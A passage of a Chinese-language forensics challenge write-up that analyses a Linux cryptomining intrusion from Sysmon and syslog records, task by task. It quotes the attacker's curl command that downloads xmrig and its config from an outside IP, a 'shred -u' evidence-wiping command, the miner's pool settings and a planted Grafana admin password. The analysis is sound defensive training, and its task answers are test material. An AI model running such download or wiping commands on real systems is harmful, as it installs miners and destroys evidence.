Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.929626000Z"/><EventRecordID>76956</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.934</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="TargetFilename">/opt/automation/xmrig</Data><Data Name="CreationUtcTime">2022-11-24 09:59:47.934</Data><Data Name="User">root</Data></EventData></Event>
Nov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.010896000Z"/><EventRecordID>76957</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.016</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">172.31.60.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">42246</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">44.204.18.94</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
Nov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.013810000Z"/><EventRecordID>76958</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.019</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="TargetFilename">/opt/automation/config.json</Data><Data Name="CreationUtcTime">2022-11-24 09:59:48.019</Data><Data Name="User">root</Data></EventData></Event>
Nov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.015060000Z"/><EventRecordID>76959</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.020</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>
```

看到以下日志

```plaintext
curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json
/opt/automation
```

```plaintext title="Answer"
/opt/automation/
```

## Task 7

> TA 使用哪个程序同时下载了加密挖矿二进制文件和配置文件？

看上一题

```plaintext title="Answer"
curl
```

## Task 8

> 我们需要确认 SOC 团队开始收集证据的确切时间，因为报告中没有包含此信息。他们使用与我们林肯系统管理员相同的公网 IP 地址。

根据这条 `syslog` 的记录

```plaintext
Nov 24 15:01:00 ip-172-31-13-147 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T15:01:00.508544000Z"/><EventRecordID>80918</EventRecordID><Correlation/><Execution ProcessID="1349" ThreadID="1349"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-13-147</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 15:01:00.511</Data><Data Name="ProcessGuid">{c9eb4a87-8703-637f-30e5-4b6291550000}</Data><Data Name="ProcessId">2355</Data><Data Name="Image">/usr/lib/openssh/sftp-server</Data><Data Name="TargetFilename">/home/ubuntu/Cat-Scale.sh</Data><Data Name="CreationUtcTime">2022-11-24 15:01:00.511</Data><Data Name="User">ubuntu</Data></EventData></Event>
```

:::note

这里的时间，指的是开始部署取证脚本的时间，而不是脚本开始执行的时间

:::

即可定位

```plaintext title="Answer"
DD/MM/YYYY HH:MM:SS
2022-11-24 15:01:00
```

## Task 9

> 请确认系统管理员在某些 Grafana 配置文件中留下的密码。

```plaintext title="\grafana\conf\defaults.ini"
# default admin password, can be changed before first start of grafana, or in profile settings
admin_password = f0rela96789!
```

```plaintext title="Answer"
f0rela96789!
```

## Task 10

> 当启动 xmrig 时，挖矿线程值设置为多少？

```plaintext
root      1089     1 2829088 9944 ?        Ssl  14:32 00:29:28 /usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json -- threads=0
```

```plaintext title="Answer"
0
```

## Task 11

> 我们的 CISO 要求获取有关可能使用的挖矿池的其他细节。请确认 TA 使用了哪个（如果有）挖矿池。

```plaintext
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mABOUT        #033[0m#033[1;36mXMRig/6.18.1#033[0m#033[1;37m gcc/5.4.0#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mLIBS         libuv/1.44.1 OpenSSL/1.1.1o hwloc/2.7.1#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mHUGE PAGES   #033[0m#033[1;32msupported#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37m1GB PAGES    #033[0m#033[1;33munavailable#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCPU          Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz (1)#033[0m #033[1;32m64-bit#033[0m #033[1;32mAES#033[1;31m VM#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0m#033[1;30mL2:#033[0m#033[1;37m0.2 MB#033[0m#033[1;30m L3:#033[0m#033[1;37m30.0 MB#033[0m#033[1;36m 1#033[0mC#033[1;30m/#033[0m#033[1;36m1#033[0mT#033[1;30m NUMA:#033[0m#033[1;36m1#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMEMORY       #033[0m#033[1;36m1.0/1.9#033[0m#033[0;36m GB#033[0m#033[1;30m (54%)#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0mDIMM 0: #033[1;36m2#033[0m#033[0;36m GB #033[0m#033[1;37mRAM @ 0 MHz #033[0m#033[1;30mDIMM 0#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMOTHERBOARD  #033[0m#033[1;37mXen#033[0m - #033[1;37mHVM domU#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mDONATE       #033[0m#033[1;37m5%#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mASSEMBLY     auto:#033[1;32mintel#033[0m#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mPOOL #1      #033[0m#033[1;32mmonero.herominers.com:10191#033[0m algo #033[1;37mrx/0#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCOMMANDS     #033[0m#033[45;1mh#033[0m#033[1;37mashrate, #033[0m#033[45;1mp#033[0m#033[1;37mause, #033[0m#033[45;1mr#033[0m#033[1;37mesume, #033[0m#033[1;37mre#033[0m#033[45m#033[1;37ms#033[0m#033[1;37mults, #033[0m#033[45;1mc#033[0m#033[1;37monnection#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.437492000Z"/><EventRecordID>77235</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.442</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-cc0f-ed9df4550000}</Data><Data Name="ProcessId">4101</Data><Data Name="Image">/usr/bin/apt-get</Data><Data Name="TargetFilename">/tmp/fileutl.message.UnyXYC</Data><Data Name="CreationUtcTime">2022-11-24 09:59:49.442</Data><Data Name="User">root</Data></EventData></Event>
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: [2022-11-24 09:59:49#033[1;30m.437#033[0m] #033[1;37m#033[46;1m#033[1;37m config  #033[0m #033[1;37mconfiguration saved to: "/usr/share/.logstxt/config.json"#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mOPENCL       #033[0m#033[1;31mdisabled#033[0m#033[0m
Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCUDA         #033[0m#033[1;31mdisabled#033[0m#033[0m
```

```plaintext title="Answer"
monero.herominers.com
```

## Task 12

> 我们无法在原始下载位置找到加密挖矿二进制文件和配置文件。TA 将它们移动到文件系统的哪个位置？

Task 10 就有

```plaintext title="ip-172-31-13-147-20221124-1501-process-exe-links.txt"
lrwxrwxrwx 1 root             root             0 Nov 24 14:46 /proc/1089/exe -> /usr/share/.logstxt/xmrig
```

```plaintext title="Answer"
/usr/share/.logstxt/xmrig
```

## Task 13

> 我们无法进行取证地恢复用于分析的 “injector.sh” 脚本。我们认为 TA 可能运行了一个命令，阻止我们恢复该文件。TA 运行了哪个命令？

继续查看 `syslog`

```plaintext
Nov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.343163000Z"/><EventRecordID>77196</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.344</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-505f-8d8aca550000}</Data><Data Name="ProcessId">4091</Data><Data Name="Image">/usr/bin/shred</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">shred -u ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
```

```plaintext title="Answer"
shred -u ./injector.sh
```

## Task 14

> 由我们的 IT 管理员创建的 cronjob 为 TA 修改的脚本运行多频繁？

分析 `syslog` 日志文件，定位每天的固定时间的相同记录即可

```plaintext title="Answer"
daily - 08:30
```
